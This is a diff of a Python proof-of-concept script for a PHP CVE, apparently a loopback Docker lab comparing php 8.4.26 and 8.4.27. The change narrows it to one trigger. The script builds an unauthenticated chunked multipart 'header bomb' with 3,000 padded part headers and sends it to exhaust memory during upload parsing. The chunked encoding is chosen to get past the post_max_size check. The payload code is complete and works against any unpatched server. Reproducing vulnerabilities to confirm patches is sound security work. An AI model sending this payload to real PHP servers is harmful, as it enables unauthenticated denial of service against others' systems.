@@ -217,60 +217,67 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-"""Prove PHP CVE-2026-109618 OOM longjmp half-initialized request cleanup."""
+"""Loopback lab for CVE-2026-109618: OOM longjmp during multipart parse.
+
+Unauthenticated chunked multipart with extra part headers spends memory_limit
+during rfc1867, before application code. Official php:8.4.26-apache returns
+"Unknown on line 0". php:8.4.27-apache stays up and runs index.php.
+"""
 
 import os
 import socket
 import subprocess
+from collections.abc import Callable
 from dataclasses import dataclass
 from pathlib import Path
 
 LABEL = "CVE-2026-109618"
 WITNESS = "CVE-2026-109618-OOM-WITNESS"
 HOST = "127.0.0.1"
-VULN_PORT = 18220
-PATCHED_PORT = 18221
-VULN_IMAGE = "php:8.4.26-apache"
-PATCHED_IMAGE = "php:8.4.27-apache"
-SAPI = "apache2handler"
-COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "cve-2026-109618")
+COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "cve-2026-109618")
 HERE = Path(__file__).resolve().parent
+SAPI = "apache2handler"
 ALIVE = "CVE-2026-109618-ALIVE"
 BOUNDARY = "----CVE2026109618OOM"
-PATH = "/index.php"
+INDEX_PATH = "/index.php"
+TRIGGER_NAME = "header-bomb-chunked"
+HOW = "oom-longjmp-startup-fatal"
 TIMEOUT_S = 40.0
 CHUNK_SIZE = 8192
+RECV_LIMIT = 2_000_000
+PART_HEADER_COUNT = 3000
+PART_HEADER_SIZE = 2500
+VULN_IMAGE = "php:8.4.26-apache"
+PATCHED_IMAGE = "php:8.4.27-apache"
+VULN_PORT = 18220
+PATCHED_PORT = 18221
+VULN_VERSION = "8.4.26"
+PATCHED_VERSION = "8.4.27"
 
-CRASH_NEEDLES = (
+_RESET = (ConnectionResetError, ConnectionAbortedError, BrokenPipeError)
+_TIMEOUT = (TimeoutError, socket.timeout)
+_OOM = ("allowed memory size", "out of memory", "exhausted")
+_CRASH = (
     "segmentation fault",
     "exit signal",
     "zend_mm_heap corrupted",
     "addresssanitizer",
     "heap-use-after-free",
     "heap-buffer-overflow",
-    "use of uninitialized",
-    "use-after-free",
     "signal 11",
-    "signal 6",
     "sigsegv",
-    "sigabrt",
-    "caught sigsegv",
-    "caught sigabrt",
-    "ah00052",
-    "ah00051",
-)
-HARD_OOM_NEEDLES = (
-    "hard memory limit",
-    "_exit(137)",
-)
-OOM_NEEDLES = (
-    "allowed memory size",
-    "out of memory",
-    "exhausted",
 )
 
 
-@dataclass
+@dataclass(frozen=True, slots=True)
+class Target:
+    name: str
+    port: int
+    image: str
+    version: str
+
+
+@dataclass(frozen=True, slots=True)
 class HttpResult:
     complete: bool
     reset: bool
@@ -280,6 +287,14 @@ class HttpResult:
     body: bytes
     error: str
     sent: int
+
+    @property
+    def text(self) -> str:
+        return self.body.decode("utf-8", "replace")
+
+
+VULN = Target("vuln", VULN_PORT, VULN_IMAGE, VULN_VERSION)
+PATCHED = Target("patched", PATCHED_PORT, PATCHED_IMAGE, PATCHED_VERSION)
 
 
 def log(msg: str) -> None:
@@ -292,19 +307,20 @@ def fail(reason: str) -> int:
 
 
 def clip(text: str, limit: int = 240) -> str:
-    text = text.replace("\r\n", "\\n").replace("\n", "\\n")
-    if len(text) > limit:
-        return text[:limit] + "..."
-    return text
+    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
+    if len(compact) > limit:
+        return compact[:limit] + "..."
+    return compact
 
 
 def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
     return subprocess.run(
-        ["docker", "compose", "-p", COMPOSE, *args],
+        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
         cwd=HERE,
         text=True,
         capture_output=True,
         timeout=timeout,
+        check=False,
     )
 
 
@@ -318,28 +334,9 @@ def service_status() -> str:
     return ((proc.stdout or "") + (proc.stderr or "")).strip()
 
 
-def php_version(service: str) -> str:
-    proc = compose("exec", "-T", service, "php", "-v", timeout=30)
-    lines = (proc.stdout or proc.stderr or "").splitlines()
-    return " | ".join(lines[:2])
-
-
-def image_tag(service: str) -> str:
-    proc = compose(
-        "exec",
-        "-T",
-        service,
-        "php",
-        "-r",
-        "echo PHP_VERSION, ' ', PHP_SAPI;",
-        timeout=30,
-    )
-    return (proc.stdout or "").strip()
-
-
-def _recv_all(sock: socket.socket, limit: int = 2_000_000) -> bytes:
+def _recv_all(sock: socket.socket) -> bytes:
     chunks = bytearray()
-    while len(chunks) < limit:
+    while len(chunks) < RECV_LIMIT:
         piece = sock.recv(65536)
         if not piece:
             break
@@ -347,104 +344,76 @@ def _recv_all(sock: socket.socket, limit: int = 2_000_000) -> bytes:
     return bytes(chunks)
 
 
-def parse_http(blob: bytes) -> tuple[int, str, bytes]:
+def _parse_http(blob: bytes) -> tuple[int, str, bytes]:
     if not blob:
         return 0, "", b""
     head, sep, body = blob.partition(b"\r\n\r\n")
     if not sep:
-        text = blob.decode("latin-1", "replace")
-        return 0, text, b""
+        return 0, blob.decode("latin-1", "replace"), b""
     header_text = head.decode("latin-1", "replace")
-    status = 0
-    first = header_text.split("\r\n", 1)[0]
-    parts = first.split()
-    if len(parts) >= 2 and parts[1].isdigit():
-        status = int(parts[1])
+    parts = header_text.split("\r\n", 1)[0].split()
+    status = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
     return status, header_text, body
 
 
-def transact(host: str, port: int, payload: bytes) -> HttpResult:
+def _failed(exc: BaseException, sent: int) -> HttpResult:
+    if isinstance(exc, _TIMEOUT):
+        return HttpResult(False, False, True, 0, "", b"", "timeout", sent)
+    err = str(exc)
+    reset = isinstance(exc, _RESET) or any(
+        tok in err.lower() for tok in ("reset", "broken pipe", "connection abort")
+    )
+    return HttpResult(False, reset, False, 0, "", b"", err, sent)
+
+
+def _exchange(port: int, send: Callable[[socket.socket], int]) -> HttpResult:
+    sent = 0
     try:
-        with socket.create_connection((host, port), TIMEOUT_S) as sock:
+        with socket.create_connection((HOST, port), TIMEOUT_S) as sock:
             sock.settimeout(TIMEOUT_S)
-            sock.sendall(payload)
+            sent = send(sock)
             sock.shutdown(socket.SHUT_WR)
             raw = _recv_all(sock)
-    except TimeoutError:
-        return HttpResult(False, False, True, 0, "", b"", "timeout", len(payload))
-    except socket.timeout:
-        return HttpResult(False, False, True, 0, "", b"", "timeout", len(payload))
-    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as exc:
-        return HttpResult(False, True, False, 0, "", b"", str(exc), len(payload))
     except OSError as exc:
-        err = str(exc).lower()
-        reset = any(tok in err for tok in ("reset", "broken pipe", "connection abort"))
-        return HttpResult(False, reset, False, 0, "", b"", str(exc), len(payload))
-    status, headers, body = parse_http(raw)
-    return HttpResult(True, False, False, status, headers, body, "", len(payload))
+        return _failed(exc, sent)
+    status, headers, body = _parse_http(raw)
+    return HttpResult(True, False, False, status, headers, body, "", sent)
 
 
-def transact_chunked(host: str, port: int, header: bytes, body: bytes) -> HttpResult:
-    sent = len(header) + len(body)
-    try:
-        with socket.create_connection((host, port), TIMEOUT_S) as sock:
-            sock.settimeout(TIMEOUT_S)
-            sock.sendall(header)
-            offset = 0
-            while offset < len(body):
-                piece = body[offset : offset + CHUNK_SIZE]
-                sock.sendall(f"{len(piece):x}\r\n".encode("ascii") + piece + b"\r\n")
-                offset += len(piece)
-            sock.sendall(b"0\r\n\r\n")
-            sock.shutdown(socket.SHUT_WR)
-            raw = _recv_all(sock)
-    except TimeoutError:
-        return HttpResult(False, False, True, 0, "", b"", "timeout", sent)
-    except socket.timeout:
-        return HttpResult(False, False, True, 0, "", b"", "timeout", sent)
-    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as exc:
-        return HttpResult(False, True, False, 0, "", b"", str(exc), sent)
-    except OSError as exc:
-        err = str(exc).lower()
-        reset = any(tok in err for tok in ("reset", "broken pipe", "connection abort"))
-        return HttpResult(False, reset, False, 0, "", b"", str(exc), sent)
-    status, headers, body_out = parse_http(raw)
-    return HttpResult(True, False, False, status, headers, body_out, "", sent)
+def _http_request(port: int, header: bytes, body: bytes = b"", *, chunked: bool) -> HttpResult:
+    def send(sock: socket.socket) -> int:
+        sock.sendall(header)
+        if not chunked:
+            if body:
+                sock.sendall(body)
+            return len(header) + len(body)
+        view = memoryview(body)
+        for start in range(0, len(body), CHUNK_SIZE):
+            piece = view[start : start + CHUNK_SIZE]
+            sock.sendall(f"{len(piece):x}\r\n".encode("ascii"))
+            sock.sendall(piece)
+            sock.sendall(b"\r\n")
+        sock.sendall(b"0\r\n\r\n")
+        return len(header) + len(body)
+
+    return _exchange(port, send)
 
 
-def get_probe(host: str, port: int) -> HttpResult:
-    req = (
-        f"GET {PATH} HTTP/1.1\r\n"
-        f"Host: {host}:{port}\r\n"
-        "Connection: close\r\n"
-        "\r\n"
-    ).encode("ascii")
-    return transact(host, port, req)
-
-
-def chunked_header(host: str, port: int) -> bytes:
+def _request_line(method: str, port: int, extra: str) -> bytes:
     return (
-        f"POST {PATH} HTTP/1.1\r\n"
-        f"Host: {host}:{port}\r\n"
-        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
-        "Transfer-Encoding: chunked\r\n"
+        f"{method} {INDEX_PATH} HTTP/1.1\r\n"
+        f"Host: {HOST}:{port}\r\n"
+        f"{extra}"
         "Connection: close\r\n"
         "\r\n"
     ).encode("ascii")
 
 
-def length_header(host: str, port: int, size: int) -> bytes:
-    return (
-        f"POST {PATH} HTTP/1.1\r\n"
-        f"Host: {host}:{port}\r\n"
-        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
-        f"Content-Length: {size}\r\n"
-        "Connection: close\r\n"
-        "\r\n"
-    ).encode("ascii")
+def get_probe(port: int) -> HttpResult:
+    return _http_request(port, _request_line("GET", port, ""), chunked=False)
 
 
-def form_part(name: str, value: str) -> bytes:
+def _form_field(name: str, value: str) -> bytes:
     return (
         f"--{BOUNDARY}\r\n"
         f'Content-Disposition: form-data; name="{name}"\r\n'
@@ -453,296 +422,126 @@ def form_part(name: str, value: str) -> bytes:
     ).encode("ascii")
 
 
-def empty_file_part(name: str, extra_headers: int, header_size: int) -> bytes:
-    lines = [
-        f"--{BOUNDARY}\r\n",
-        f'Content-Disposition: form-data; name="{name}"; filename=""\r\n',
-        "Content-Type: application/octet-stream\r\n",
-    ]
-    pad = "A" * header_size
-    for i in range(extra_headers):
-        lines.append(f"X-Pad-{i}: {pad}\r\n")
-    lines.append("\r\n")
-    return "".join(lines).encode("ascii")
-
-
-def nested_name(index: int, depth: int) -> str:
-    pieces = [str(index)] + [str(d) for d in range(depth)]
-    return "f[" + "][".join(pieces) + "]"
-
-
-def build_nested_body(
-    count: int,
-    depth: int,
-    extra_headers: int,
-    header_size: int,
-) -> bytes:
-    parts = [
-        form_part("PHP_SESSION_UPLOAD_PROGRESS", "oomlab"),
-        form_part("PHPSESSID", "oomlabid"),
-    ]
-    for i in range(count):
-        parts.append(empty_file_part(nested_name(i, depth), extra_headers, header_size))
-    parts.append(f"--{BOUNDARY}--\r\n".encode("ascii"))
-    return b"".join(parts)
-
-
-def build_header_bomb(num_headers: int, header_size: int) -> bytes:
-    pad = "B" * header_size
-    lines = [
-        f"--{BOUNDARY}\r\n",
-        'Content-Disposition: form-data; name="h"; filename="x"\r\n',
-    ]
-    for i in range(num_headers):
-        lines.append(f"X-Pad-{i}: {pad}\r\n")
-    lines.append("\r\nZ\r\n")
-    lines.append(f"--{BOUNDARY}--\r\n")
-    prefix = [
-        form_part("PHP_SESSION_UPLOAD_PROGRESS", "oomlab"),
-        form_part("PHPSESSID", "oomlabid"),
-    ]
-    return b"".join(prefix) + "".join(lines).encode("ascii")
-
-
-def build_followup_body() -> bytes:
+def header_bomb() -> bytes:
+    """One multipart part whose in-memory headers dwarf the wire body."""
+    pad = "B" * PART_HEADER_SIZE
+    extra = "".join(f"X-Pad-{i}: {pad}\r\n" for i in range(PART_HEADER_COUNT))
+    part = (
+        f"--{BOUNDARY}\r\n"
+        'Content-Disposition: form-data; name="h"; filename="x"\r\n'
+        f"{extra}"
+        "\r\n"
+        "Z\r\n"
+        f"--{BOUNDARY}--\r\n"
+    ).encode("ascii")
     return (
-        form_part("PHP_SESSION_UPLOAD_PROGRESS", "follow")
-        + empty_file_part("tiny", 0, 0)
-        + f"--{BOUNDARY}--\r\n".encode("ascii")
+        _form_field("PHP_SESSION_UPLOAD_PROGRESS", "oomlab")
+        + _form_field("PHPSESSID", "oomlabid")
+        + part
     )
 
 
-def send_trigger(host: str, port: int, body: bytes, chunked: bool) -> HttpResult:
-    if chunked:
-        return transact_chunked(host, port, chunked_header(host, port), body)
-    return transact(host, port, length_header(host, port, len(body)) + body)
+def send_trigger(port: int, body: bytes) -> HttpResult:
+    # Chunked, no Content-Length: walk past the first post_max_size gate.
+    extra = (
+        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+    )
+    return _http_request(port, _request_line("POST", port, extra), body, chunked=True)
 
 
 def summarize(name: str, result: HttpResult) -> None:
-    body = result.body.decode("utf-8", "replace")
     log(
         f"{name} complete={int(result.complete)} reset={int(result.reset)} "
         f"timeout={int(result.timeout)} status={result.status} sent={result.sent} "
         f"error={result.error!r} headers={clip(result.headers, 180)!r} "
-        f"body={clip(body, 180)!r}"
+        f"body={clip(result.text, 180)!r}"
     )
-
-
-def blob_has(blob: str, needles: tuple[str, ...]) -> bool:
-    low = blob.lower()
-    return any(n in low for n in needles)
-
-
-def cookie_php_sessid(headers: str) -> str:
-    for line in headers.split("\r\n"):
-        if line.lower().startswith("set-cookie:") and "phpsessid=" in line.lower():
-            return line.split(":", 1)[1].strip()
-    return ""
 
 
 def is_alive(result: HttpResult) -> bool:
-    if not result.complete or result.reset:
-        return False
-    text = result.body.decode("utf-8", "replace")
-    return result.status == 200 and ALIVE in text
+    return result.complete and not result.reset and result.status == 200 and ALIVE in result.text
 
 
-def body_text(result: HttpResult) -> str:
-    return result.body.decode("utf-8", "replace")
+def _has(blob: str, needles: tuple[str, ...]) -> bool:
+    low = blob.lower()
+    return any(token in low for token in needles)
 
 
 def oom_startup_fatal(result: HttpResult, logs: str) -> bool:
-    text = body_text(result).lower()
-    log_hit = blob_has(logs, OOM_NEEDLES) and "unknown on line 0" in logs.lower()
-    body_hit = (
-        "allowed memory size" in text
-        and "unknown" in text
-        and "on line" in text
-        and ALIVE not in body_text(result)
-    )
-    return body_hit or (log_hit and ALIVE not in body_text(result))
-
-
-def crash_how(result: HttpResult, logs: str) -> str | None:
-    if result.reset:
-        return "connection-reset"
-    if blob_has(logs, CRASH_NEEDLES):
-        if "addresssanitizer" in logs.lower() or "heap-use-after-free" in logs.lower():
-            return "asan-uaf"
-        if "zend_mm_heap corrupted" in logs.lower():
-            return "zend-mm-heap-corrupted"
-        if "segmentation fault" in logs.lower() or "signal 11" in logs.lower():
-            return "segfault"
-        return "worker-abort"
-    if oom_startup_fatal(result, logs):
-        return "oom-longjmp-startup-fatal"
-    if result.timeout and not result.complete:
-        return "timeout-incomplete"
-    if (not result.complete) and result.status == 0:
-        return "incomplete"
-    return None
-
-
-def patched_clean(result: HttpResult, logs: str) -> bool:
-    if result.reset or blob_has(logs, CRASH_NEEDLES) or blob_has(logs, HARD_OOM_NEEDLES):
+    if ALIVE in result.text:
         return False
-    if result.timeout and not result.complete:
-        return False
-    if is_alive(result):
-        return True
-    if oom_startup_fatal(result, logs):
-        return False
-    if result.status in (200, 400, 411, 413, 500) or (
-        result.complete and result.status == 0 and not result.body
-    ):
-        return True
-    return result.complete and not result.reset
+    text = result.text.lower()
+    body_hit = "allowed memory size" in text and "unknown" in text and "on line" in text
+    log_hit = _has(logs, _OOM) and "unknown on line 0" in logs.lower()
+    return body_hit or log_hit
 
 
 def ioc_logs(service: str, logs: str, status: str) -> None:
     log(f"IOC {service}-status {status!r}")
+    hits = 0
     for line in logs.splitlines():
         low = line.lower()
-        if any(
-            tok in low
-            for tok in (
-                "segmentation",
-                "signal",
-                "asan",
-                "addresssanitizer",
-                "heap",
-                "abort",
-                "fatal",
-                "memory",
-                "exhausted",
-                "error",
-                "child pid",
-            )
-        ):
-            log(f"IOC {service}-log {clip(line.strip(), 300)}")
-
-
-def build_seed_then_header_bomb(num_headers: int, header_size: int) -> bytes:
-    seed = (
-        form_part("PHP_SESSION_UPLOAD_PROGRESS", "oomlab")
-        + form_part("PHPSESSID", "oomlabid")
-        + (
-            f"--{BOUNDARY}\r\n"
-            'Content-Disposition: form-data; name="seed"; filename="s.bin"\r\n'
-            "Content-Type: application/octet-stream\r\n"
-            "\r\n"
-            "SEED\r\n"
-        ).encode("ascii")
-    )
-    return seed + build_header_bomb(num_headers, header_size)
-
-
-TRIGGERS: tuple[tuple[str, bytes, bool], ...] = (
-    ("header-bomb-chunked", build_header_bomb(3000, 2500), True),
-    ("header-bomb-length", build_header_bomb(3000, 2500), False),
-    ("seed-then-header-bomb-chunked", build_seed_then_header_bomb(3000, 2500), True),
-    ("nested-empty-files-chunked", build_nested_body(4000, 16, 0, 0), True),
-)
+        if not any(tok in low for tok in ("fatal", "memory", "exhausted", "unknown", "signal", "zend_mm")):
+            continue
+        log(f"IOC {service}-log {clip(line.strip(), 300)}")
+        hits += 1
+        if hits >= 16:
+            break
 
 
 def main() -> int:
     log(
-        f"label={LABEL} vuln={HOST}:{VULN_PORT} patched={HOST}:{PATCHED_PORT} "
-        f"vuln-image={VULN_IMAGE} patched-image={PATCHED_IMAGE} sapi={SAPI}"
+        f"label={LABEL} vuln={HOST}:{VULN.port} patched={HOST}:{PATCHED.port} "
+        f"vuln-image={VULN.image} patched-image={PATCHED.image} sapi={SAPI}"
     )
-    log("vuln-php " + php_version("vuln"))
-    log("patched-php " + php_version("patched"))
-    vuln_tag = image_tag("vuln") or VULN_IMAGE
-    patched_tag = image_tag("patched") or PATCHED_IMAGE
-    log(f"vuln-runtime {vuln_tag!r} patched-runtime {patched_tag!r}")
 
-    log("== GET probes ==")
-    vuln_get = get_probe(HOST, VULN_PORT)
-    patched_get = get_probe(HOST, PATCHED_PORT)
+    vuln_get = get_probe(VULN.port)
+    patched_get = get_probe(PATCHED.port)
     summarize("vuln-get", vuln_get)
     summarize("patched-get", patched_get)
     if not is_alive(vuln_get):
         return fail("vuln-get-not-alive")
     if not is_alive(patched_get):
         return fail("patched-get-not-alive")
-    if "8.4.26" not in vuln_get.body.decode("utf-8", "replace"):
+    if VULN.version not in vuln_get.text:
         return fail("vuln-not-8.4.26")
-    if "8.4.27" not in patched_get.body.decode("utf-8", "replace"):
+    if PATCHED.version not in patched_get.text:
         return fail("patched-not-8.4.27")
 
-    follow = build_followup_body()
-    status_blob = service_status()
-    log(f"IOC compose-ps {clip(status_blob, 200)}")
+    body = header_bomb()
+    log(f"== trigger {TRIGGER_NAME} bytes={len(body)} chunked=1 ==")
 
-    for name, body, chunked in TRIGGERS:
-        log(
-            f"== trigger {name} bytes={len(body)} chunked={int(chunked)} =="
-        )
-        patched = send_trigger(HOST, PATCHED_PORT, body, chunked)
-        summarize(f"patched-{name}", patched)
-        patched_logs = service_logs("patched")
-        ioc_logs("patched", patched_logs, service_status())
-        patched_ok = patched_clean(patched, patched_logs)
-        patched_after = get_probe(HOST, PATCHED_PORT)
-        summarize("patched-after", patched_after)
-        if not is_alive(patched_after):
-            patched_ok = False
-        log(f"patched-ok={int(patched_ok)}")
-        if not patched_ok:
-            log(f"IOC patched-not-ok-on {name}; try next trigger")
-            continue
+    patched = send_trigger(PATCHED.port, body)
+    summarize(f"patched-{TRIGGER_NAME}", patched)
+    patched_logs = service_logs(PATCHED.name)
+    ioc_logs(PATCHED.name, patched_logs, service_status())
+    patched_after = get_probe(PATCHED.port)
+    summarize("patched-after", patched_after)
+    if not is_alive(patched) or not is_alive(patched_after) or _has(patched_logs, _CRASH):
+        return fail("patched-not-ok")
 
-        vuln = send_trigger(HOST, VULN_PORT, body, chunked)
-        summarize(f"vuln-{name}", vuln)
-        vuln_logs = service_logs("vuln")
-        ioc_logs("vuln", vuln_logs, service_status())
-        how = crash_how(vuln, vuln_logs)
-        log(f"vuln-crash-how={how}")
+    vuln = send_trigger(VULN.port, body)
+    summarize(f"vuln-{TRIGGER_NAME}", vuln)
+    vuln_logs = service_logs(VULN.name)
+    ioc_logs(VULN.name, vuln_logs, service_status())
+    vuln_after = get_probe(VULN.port)
+    patched_final = get_probe(PATCHED.port)
+    summarize("vuln-after", vuln_after)
+    summarize("patched-final", patched_final)
+    if not oom_startup_fatal(vuln, vuln_logs):
+        return fail("vuln-no-oom-longjmp")
+    if not is_alive(patched_final):
+        return fail("patched-died-after")
 
-        leak_how: str | None = None
-        if how is None:
-            follow_v = send_trigger(HOST, VULN_PORT, follow, False)
-            summarize(f"vuln-follow-{name}", follow_v)
-            vuln_logs = service_logs("vuln")
-            ioc_logs("vuln-follow", vuln_logs, service_status())
-            how = crash_how(follow_v, vuln_logs)
-            cookie = cookie_php_sessid(follow_v.headers)
-            log(f"IOC vuln-follow-cookie {clip(cookie, 160)!r} len={len(cookie)}")
-            if how is None and len(cookie) > 200:
-                leak_how = "stale-phpsessid-uninit-read"
-            follow_p = send_trigger(HOST, PATCHED_PORT, follow, False)
-            summarize(f"patched-follow-{name}", follow_p)
-            p_cookie = cookie_php_sessid(follow_p.headers)
-            log(f"IOC patched-follow-cookie {clip(p_cookie, 160)!r} len={len(p_cookie)}")
-            if leak_how and len(p_cookie) > 200:
-                leak_how = None
-
-        if how is None and leak_how:
-            how = leak_how
-
-        vuln_after = get_probe(HOST, VULN_PORT)
-        summarize("vuln-after", vuln_after)
-        patched_final = get_probe(HOST, PATCHED_PORT)
-        summarize("patched-final", patched_final)
-        if not is_alive(patched_final):
-            log(f"IOC patched-died-after {name}")
-            continue
-
-        if how is None:
-            log(f"IOC vuln-no-crash-on {name}")
-            continue
-
-        log(
-            f"SUCCESS {LABEL} vuln-crash=yes patched-ok=yes sapi={SAPI} "
-            f"vuln-image={VULN_IMAGE} patched-image={PATCHED_IMAGE} "
-            f"how={how} trigger={name} asan=no {WITNESS}"
-        )
-        return 0
-
-    return fail("trigger-did-not-distinguish-last-affected-vs-patched")
+    log(
+        f"SUCCESS {LABEL} vuln-crash=yes patched-ok=yes sapi={SAPI} "
+        f"vuln-image={VULN.image} patched-image={PATCHED.image} "
+        f"how={HOW} trigger={TRIGGER_NAME} asan=no {WITNESS}"
+    )
+    return 0
 
 
 if __name__ == "__main__":
     raise SystemExit(main())
-
 
